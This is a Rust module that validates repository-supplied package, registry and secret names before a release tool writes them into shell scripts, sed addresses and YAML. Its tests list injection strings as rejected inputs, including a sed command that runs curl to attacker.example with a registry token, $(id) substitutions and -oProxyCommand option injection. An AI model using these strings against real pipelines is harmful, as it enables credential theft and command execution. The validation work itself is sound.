// ---
// relationships:
//   implements: github-release-executor
// ---

//! Validation of every name a repository supplies to a maintained recipe.
//!
//! A publisher job's steps are shell scripts, YAML documents and command lines
//! built by derivation. Most of what they contain this executor chose. A few
//! values did not come from here: they were read out of the repository being
//! released — a package manifest, a configuration key — and they reach places
//! that interpret text.
//!
//! Those places are the reason this module exists rather than a quoting
//! convention at each call site. The sinks a repository-supplied name can reach
//! are:
//!
//! * **Shell text.** A `run:` body is source, and these bodies hold registry
//!   credentials. Routing through `env:` and quoting keeps a value data.
//! * **Interpreted arguments.** Quoting a value into a shell command does not
//!   stop the command from interpreting it. A `sed` script is the case that
//!   matters here: GNU `sed`'s `e` command executes its argument through a
//!   shell, so a name reaching a `sed` address is executable text no amount of
//!   shell quoting contains.
//! * **YAML scalars.** A name written into a document with `printf '"%s"'` can
//!   close the quote or break the line, producing a document whose loader
//!   rejects it — three jobs after the step that wrote it.
//! * **Argument vectors.** A name passed as its own `argv` element is data to
//!   the shell, and still whatever the receiving program makes of it.
//!
//! Enumerating the sinks is how the rule was chosen, not a substitute for it.
//! Every one of them is safe for a name that is an identifier over a small
//! character set, and each function here refuses anything else at the point the
//! value enters the model. A caller therefore never has to know which sinks its
//! value will reach, which is the property a per-sink escape does not give: the
//! next sink is added by someone who does not know the value was ever
//! dangerous.

/// One name a repository supplied, and where it came from.
///
/// The origin is carried so a refusal names the file the author has to edit
/// rather than the internal value it became.
pub struct SuppliedName<'a> {
    /// Configured or manifest location the value was read from.
    pub origin: &'a str,
    /// Value as the repository spelled it.
    pub value: &'a str,
}

/// Characters an npm package name may carry beyond letters and digits.
///
/// npm rejects uppercase in names created today and still serves names created
/// before it did, and a repository publishing such a name is publishing a real
/// package. The rule is therefore about what is safe at the sinks rather than
/// about what npm would accept from a new author: letters in either case are
/// inert in shell source, in a `sed` address, in a YAML scalar and in an
/// argument vector, so a legacy name is admitted and refusing it would break a
/// publication for a reason this module has no standing to raise.
const NPM_EXTRA: [char; 4] = ['-', '.', '_', '~'];

/// Characters a Cargo crate name may carry beyond letters and digits.
const CARGO_EXTRA: [char; 2] = ['-', '_'];

/// Characters a GitHub secret identifier may carry beyond letters and digits.
const SECRET_EXTRA: [char; 1] = ['_'];

/// Characters a Cargo registry name may carry beyond letters and digits.
const REGISTRY_EXTRA: [char; 2] = ['-', '_'];

/// Characters a release-unit identifier may carry beyond letters and digits.
const RELEASE_UNIT_EXTRA: [char; 3] = ['-', '.', '_'];

/// Characters an Arch package name may carry beyond letters and digits.
const ARCH_PACKAGE_EXTRA: [char; 5] = ['@', '.', '_', '+', '-'];

/// Reject an npm package name a maintained recipe would carry into a script.
///
/// A scoped name is one scope segment and one name segment, each held to the
/// same rule; an unscoped name is the name segment alone.
pub fn npm_package(supplied: &SuppliedName<'_>) -> Result<String, String> {
    let name = supplied.value;
    let accepted = match name.strip_prefix('@') {
        None => segment(name, &NPM_EXTRA),
        Some(scoped) => match scoped.split_once('/') {
            Some((scope, package)) => segment(scope, &NPM_EXTRA) && segment(package, &NPM_EXTRA),
            None => false,
        },
    };
    if accepted {
        Ok(name.to_owned())
    } else {
        Err(refusal(
            supplied,
            "an npm package name",
            "an optional @scope/ followed by letters, digits, hyphens, dots, underscores and tildes, each part starting with a letter or digit",
        ))
    }
}

/// Reject a Cargo crate name a maintained recipe would carry into a script.
pub fn cargo_crate(supplied: &SuppliedName<'_>) -> Result<String, String> {
    accept(
        supplied,
        &CARGO_EXTRA,
        "a crate name",
        "letters, digits, hyphens and underscores, starting with a letter or digit",
    )
}

/// Reject an Arch package name a maintained recipe would carry into a repository URL.
///
/// The name becomes the path in
/// `ssh://aur@aur.archlinux.org/${INTENTIONAL_DESTINATION}.git` inside the
/// credentialed promotion body. Routing it through `env:` and quoting the
/// dereference keeps it out of shell source; this rule keeps it one package
/// name rather than letting a slash select a different clone path.
pub fn arch_package(supplied: &SuppliedName<'_>) -> Result<String, String> {
    let name = supplied.value;
    if !name.is_empty()
        && !name.starts_with(['-', '.'])
        && name.chars().all(|character| {
            character.is_ascii_alphanumeric() || ARCH_PACKAGE_EXTRA.contains(&character)
        })
    {
        Ok(name.to_owned())
    } else {
        Err(refusal(
            supplied,
            "an Arch package name",
            "letters, digits, at signs, periods, underscores, plus signs and hyphens, not starting with a hyphen or period",
        ))
    }
}

/// Reject a configured Cargo registry name a maintained recipe will not name.
///
/// The name becomes a `--registry` argument in a `run:` body that holds the
/// registry token, and part of the `CARGO_REGISTRIES_<NAME>_TOKEN` variable
/// cargo reads.
pub fn registry(supplied: &SuppliedName<'_>) -> Result<String, String> {
    accept(
        supplied,
        &REGISTRY_EXTRA,
        "a Cargo registry name",
        "letters, digits, hyphens and underscores, starting with a letter or digit",
    )
}

/// Reject a Cargo registry index a maintained recipe would resolve through.
///
/// The index is read out of the workspace's `.cargo/config.toml` at derivation
/// and passed to the probe as the environment variable cargo reads for it, so
/// the probe inherits no configuration and this one value is the whole of what
/// crosses. It is not an identifier, so it is held to the shape of the thing it
/// is: a fetchable index URL, spelled the way cargo spells one, over RFC 3986's
/// unreserved and reserved sets.
///
/// That set is not free of shell metacharacters — it contains `$`, `&`, `;`, a
/// single quote and more — and claiming otherwise would be the kind of sentence
/// a reader checks against the code and finds false. What makes those
/// characters inert is the value's one sink: it is routed through `env:` and
/// read only as `"${<prefix>REGISTRY_INDEX_URL}"` inside a quoted array
/// element, never unquoted and never in command position. Whitespace and
/// control characters are excluded outright, because those would split the
/// element regardless of quoting. A future sink that read this value unquoted
/// would need this rule narrowed, not merely re-read.
pub fn registry_index(supplied: &SuppliedName<'_>) -> Result<String, String> {
    let value = supplied.value;
    let addressed = value
        .strip_prefix("sparse+https://")
        .or_else(|| value.strip_prefix("https://"))
        .or_else(|| value.strip_prefix("ssh://"));
    let accepted = addressed.is_some_and(|rest| {
        !rest.is_empty()
            && rest.chars().all(|character| {
                character.is_ascii_alphanumeric() || "-._~:/?#[]@!$&'()*+,;=%".contains(character)
            })
    });
    if accepted {
        Ok(value.to_owned())
    } else {
        Err(refusal(
            supplied,
            "a Cargo registry index",
            "an https, sparse+https or ssh URL over unreserved and reserved URL characters",
        ))
    }
}

/// Reject a release-unit identifier a maintained recipe would write into evidence.
///
/// The identifier is a configuration mapping key, so it is repository content
/// like any manifest value. It reaches an Action input, a YAML scalar in the
/// observation, and the publication identity verification resolves.
///
/// This is deliberately narrower than [`crate::config`]'s own identifier rule,
/// which admits `@` and `/` so a workspace can key a release unit the way a
/// scoped package is named. That is the right rule for a workspace: an id is a
/// map key there, and a release unit that publishes nothing never reaches any
/// of the sinks above. It is the wrong rule for a publishing one — a `/` in a
/// `sed` address terminates the address, and the subject-identity stand-in
/// reaches exactly that — so publication holds the same value to less. The two
/// are pinned against each other by a test, because a widening of either is
/// otherwise invisible to the other, and the difference is a refusal an author
/// can act on rather than a shape that fails on a release runner.
pub fn release_unit(supplied: &SuppliedName<'_>) -> Result<String, String> {
    accept(
        supplied,
        &RELEASE_UNIT_EXTRA,
        "a release-unit identifier that publishes",
        "letters, digits, hyphens, dots and underscores, starting with a letter or digit; a release unit that publishes is named in its recipe's scripts and evidence, so rename it or remove its publisher configuration",
    )
}

/// Longest repository name the OCI distribution specification admits.
pub const MAX_OCI_SUBJECT: usize = 255;

/// Reject a source-declared OCI subject name a destination could not resolve.
///
/// This name is the one identity a release takes from repository *source*
/// rather than from configuration: a Dockerfile's
/// `org.opencontainers.image.title` label, or a Dev Container Feature's id. It
/// reaches every sink this module exists for, and one more that the others do
/// not — it becomes a registry reference each destination has to resolve.
///
/// So the accepted shape is the OCI repository-name grammar rather than this
/// module's identifier rule. It is narrower than what the annotation itself
/// permits: `org.opencontainers.image.title` is specified as a human-readable
/// title, so a conforming Dockerfile may declare `Example Image`. Refusing that
/// here, where the refusal names the file and the label, is the difference
/// between a derivation failure a maintainer can fix and a `crane push` failure
/// on a release runner.
///
/// It is narrower than the OCI grammar in two further ways, and both are
/// choices. Repeated separators are refused, though the grammar permits them,
/// so one separator means one boundary. Upper case is refused, though a Feature
/// id may legally carry it, because a registry path is lower-case and a name
/// that has to be folded before it resolves is not the name the source
/// declared. Both fail closed: a maintainer renames the subject once rather
/// than discovering the fold at a destination.
pub fn oci_subject(supplied: &SuppliedName<'_>) -> Result<String, String> {
    let name = supplied.value;
    let component = |part: &str| {
        !part.is_empty()
            && part.split(['.', '_', '-']).all(|run| {
                !run.is_empty()
                    && run
                        .chars()
                        .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
            })
    };
    // No separate emptiness check: `"".split('/')` yields one empty component
    // and `component` is false on its first conjunct, so the component rule
    // already rejects the empty name for every caller.
    if name.len() <= MAX_OCI_SUBJECT && name.split('/').all(component) {
        Ok(name.to_owned())
    } else {
        Err(refusal(
            supplied,
            "an OCI repository name",
            &format!(
                "at most {MAX_OCI_SUBJECT} characters of lower-case alphanumeric components separated by one period, underscore or hyphen, because every destination has to resolve this name"
            ),
        ))
    }
}

/// Reject a configured secret name GitHub could not resolve.
///
/// The name is spliced into a `${{ secrets.NAME }}` expression, which is an
/// identifier position rather than a value position: a name carrying a bracket
/// or a quote would not name a missing secret, it would change what the
/// expression evaluates.
pub fn secret(configured: Option<&SuppliedName<'_>>, conventional: &str) -> Result<String, String> {
    let Some(supplied) = configured else {
        return Ok(conventional.to_owned());
    };
    if segment(supplied.value, &SECRET_EXTRA)
        && !supplied
            .value
            .starts_with(|character: char| character.is_ascii_digit())
    {
        Ok(supplied.value.to_owned())
    } else {
        Err(refusal(
            supplied,
            "a GitHub secret name",
            "letters, digits and underscores, not starting with a digit",
        ))
    }
}

/// Accept one whole name held to a single segment rule.
fn accept(
    supplied: &SuppliedName<'_>,
    extra: &[char],
    noun: &str,
    permitted: &str,
) -> Result<String, String> {
    if segment(supplied.value, extra) {
        Ok(supplied.value.to_owned())
    } else {
        Err(refusal(supplied, noun, permitted))
    }
}

/// Whether one segment is an identifier over letters, digits and `extra`.
///
/// The leading character is held to letters and digits separately, because
/// every one of these ecosystems refuses a name beginning with its punctuation
/// and because a leading `-` is an option rather than a name wherever the value
/// reaches an argument vector.
fn segment(value: &str, extra: &[char]) -> bool {
    !value.is_empty()
        && value.starts_with(|character: char| character.is_ascii_alphanumeric())
        && value
            .chars()
            .all(|character| character.is_ascii_alphanumeric() || extra.contains(&character))
}

/// One refusal naming the value, where it came from, and what is permitted.
fn refusal(supplied: &SuppliedName<'_>, noun: &str, permitted: &str) -> String {
    format!(
        "{} is not {noun}: {:?} reaches a maintained recipe's scripts and evidence, which admit {permitted}",
        supplied.origin, supplied.value
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    const ACCEPTED_ARCH_NAMES: [&str; 8] = [
        "example-tool-bin",
        "example2",
        "ExampleTool",
        "example.tool_bin",
        "example+tool@stable",
        "@stable",
        "_private",
        "+instrumented",
    ];

    fn supplied(value: &str) -> SuppliedName<'_> {
        SuppliedName {
            origin: "component",
            value,
        }
    }

    // The reproductions the review filed, kept as the cases they are: a name
    // that reaches a `sed` address where GNU `sed`'s `e` command executes it,
    // and a name that closes the quote of the YAML scalar it is printed into.
    // Both derived cleanly before this rule existed, and both are refused by
    // the same rule that refuses the ordinary typos below.
    #[test]
    fn refuses_a_name_that_would_execute_or_reshape_what_it_reaches() {
        for hostile in [
            r#"a"$/e echo PWNED; sh -c 'curl http://attacker.example/$CARGO_REGISTRY_TOKEN' #"#,
            "a\"; curl http://attacker.example",
            "a\nname",
            "a$(id)",
            "a`id`",
            "a'b",
            // A scoped name has two segments and both are held to the rule.
            // Every hostile value above is unscoped, so a weaker scope check --
            // non-empty rather than well-formed -- would pass all of them; the
            // scope half needs a case where the package half is impeccable.
            "@a$(id)/example-component",
            "@a\"; curl http://attacker.example/x/example-component",
            "@-oProxyCommand/example-component",
            // A name is passed as its own argument vector element in several
            // places, and a leading hyphen there is an option rather than a
            // name. These carry no character the charsets refuse, so the
            // leading-character rule is the only thing standing between them
            // and a command line -- which is why they are listed separately
            // from the values that would also fail on their contents.
            "-oProxyCommand",
            "--registry",
            "-rf",
            // Every one of these ecosystems refuses a name beginning with its
            // own punctuation, so a name that starts with one is not a name
            // this recipe could publish under.
            ".hidden",
            "_private",
            "-oProxyCommand=id",
            "",
        ] {
            let supplied = supplied(hostile);
            assert!(
                cargo_crate(&supplied).is_err(),
                "a crate name admits {hostile:?}"
            );
            assert!(
                npm_package(&supplied).is_err(),
                "an npm package name admits {hostile:?}"
            );
            assert!(
                registry(&supplied).is_err(),
                "a registry name admits {hostile:?}"
            );
            assert!(
                release_unit(&supplied).is_err(),
                "a release-unit identifier admits {hostile:?}"
            );
            assert!(
                secret(Some(&supplied), "CONVENTIONAL").is_err(),
                "a secret name admits {hostile:?}"
            );
        }
    }

    // The workspace admits identifiers publication does not, and that gap is a
    // decision rather than an accident: a workspace keys a release unit however
    // it likes, and only a publishing one is named in a `sed` address, an
    // argument vector and a YAML scalar. The gap is pinned here because a
    // widening of either rule is invisible to the other -- and because the
    // shapes in the middle are the ones an author is most likely to type, so
    // what they get has to be a refusal that names the fix rather than a
    // workflow that fails where nobody can read it.
    #[test]
    fn stays_narrower_than_the_workspace_rule_it_is_pinned_against() {
        // Admitted by both: an ordinary release-unit identifier.
        for shared in ["component", "example-component", "example.component"] {
            assert!(
                crate::config::validate_release_unit_id(shared).is_ok(),
                "the workspace admits {shared}"
            );
            assert!(
                release_unit(&supplied(shared)).is_ok(),
                "publication admits {shared}"
            );
        }
        // Admitted by the workspace, refused by publication. Each of these
        // derives a diagnostic naming the release unit rather than a workflow.
        for narrowed in [
            "example-owner/component",
            "@example-owner/component",
            "@component",
            "-rf",
            ".hidden",
        ] {
            assert!(
                crate::config::validate_release_unit_id(narrowed).is_ok(),
                "the workspace admits {narrowed}"
            );
            let refusal = release_unit(&supplied(narrowed))
                .expect_err("publication refuses what its sinks cannot carry");
            assert!(
                refusal.contains("rename it or remove its publisher configuration"),
                "the refusal names what an author can do: {refusal}"
            );
        }
        // Refused by both, so the workspace is the first to speak.
        for refused in ["a b", "a\"b", "a$(id)"] {
            assert!(
                crate::config::validate_release_unit_id(refused).is_err(),
                "the workspace refuses {refused}"
            );
        }
    }

    #[test]
    fn accepts_the_names_these_ecosystems_actually_publish() {
        for name in ["serde", "example-component", "example_component", "tokio1"] {
            assert!(cargo_crate(&supplied(name)).is_ok(), "{name}");
        }
        for name in [
            "example-component",
            "@example-owner/example-component",
            "lodash.merge",
            "example~1",
        ] {
            assert!(npm_package(&supplied(name)).is_ok(), "{name}");
        }
        // A scope without a package, and a package without a scope after the
        // marker, are both incomplete rather than merely unusual.
        for name in ["@example-owner", "@example-owner/", "@/example-component"] {
            assert!(npm_package(&supplied(name)).is_err(), "{name}");
        }
        assert_eq!(
            secret(None, "NPM_TOKEN").expect("the conventional name stands"),
            "NPM_TOKEN"
        );
        assert!(secret(Some(&supplied("1TOKEN")), "NPM_TOKEN").is_err());
        let accepted_arch_names = ACCEPTED_ARCH_NAMES
            .into_iter()
            .map(|name| (name, arch_package(&supplied(name))))
            .collect::<Vec<_>>();
        assert_eq!(
            accepted_arch_names.iter().fold(
                (false, false),
                |(has_digit, has_uppercase), (_, accepted)| {
                    let accepted = accepted.as_deref().unwrap_or_default();
                    (
                        has_digit || accepted.chars().any(|character| character.is_ascii_digit()),
                        has_uppercase
                            || accepted
                                .chars()
                                .any(|character| character.is_ascii_uppercase()),
                    )
                }
            ),
            (true, true),
            "accepted Arch derivations witness digits and uppercase letters"
        );
        for (name, accepted) in accepted_arch_names {
            assert!(accepted.is_ok(), "{name}");
        }
        for name in ["", "invalid/name", "invalid name", "-invalid", ".invalid"] {
            assert!(arch_package(&supplied(name)).is_err(), "{name}");
        }
    }
}
